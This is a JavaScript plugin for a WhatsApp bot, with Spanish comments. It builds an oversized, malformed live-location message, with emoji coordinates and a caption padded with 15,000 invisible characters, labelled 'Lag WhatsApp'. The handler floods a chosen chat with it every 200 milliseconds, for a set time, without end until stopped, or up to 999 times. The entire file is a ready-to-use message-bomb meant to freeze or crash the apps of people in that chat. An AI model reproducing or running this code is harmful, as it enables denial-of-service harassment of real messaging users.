
const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

const activeBombs = new Map()

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) return

  const jid = m.chat
  const text = m.text?.trim()

  // Comando ฯ con duración
  const timedMatch = text.match(/^ฯ-(\d+)([mh])$/i)
  if (timedMatch) {
    const value = parseInt(timedMatch[1])
    const unit = timedMatch[2].toLowerCase()
    const durationMs = unit === 'm' ? value * 60_000 : value * 60 * 60_000

    const interval = setInterval(async () => {
      try {
        await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      } catch (error) {
        console.error('Error al enviar bomba:', error)
      }
    }, 200)

    activeBombs.set(jid, interval)

    setTimeout(() => {
      clearInterval(interval)
      activeBombs.delete(jid)
    }, durationMs)

    return
  }

  // Comando ฯ sin duración (infinito)
  if (/^ฯ$/i.test(text)) {
    if (activeBombs.has(jid)) return // Ya está activo

    const interval = setInterval(async () => {
      try {
        await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      } catch (error) {
        console.error('Error al enviar bomba infinita:', error)
      }
    }, 200)

    activeBombs.set(jid, interval)
    return
  }

  // Comando θ para detener
  if (/^θ$/i.test(text)) {
    const interval = activeBombs.get(jid)
    if (interval) {
      clearInterval(interval)
      activeBombs.delete(jid)
    }
    return
  }

  // Comando original ¤-n
  const match = text.match(/^¤(?:-(\d{1,3}))?$/)
  if (match) {
    const repeatCount = parseInt(match[1]) || 1
    if (repeatCount < 1 || repeatCount >= 1000) return

    for (let i = 0; i < repeatCount; i++) {
      try {
        await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
        await new Promise(resolve => setTimeout(resolve, 200))
      } catch (error) {
        console.error('Error al enviar mensaje:', error)
      }
    }
  }
}

handler.command = new RegExp
handler.customPrefix = /^¤(?:-\d{1,3})?$|^ฯ(?:-\d+[mh])?$|^θ$/i
handler.tags = ['owner']
handler.help = ['¤-n', 'ฯ-1m', 'ฯ-1h', 'ฯ', 'θ']

export default handler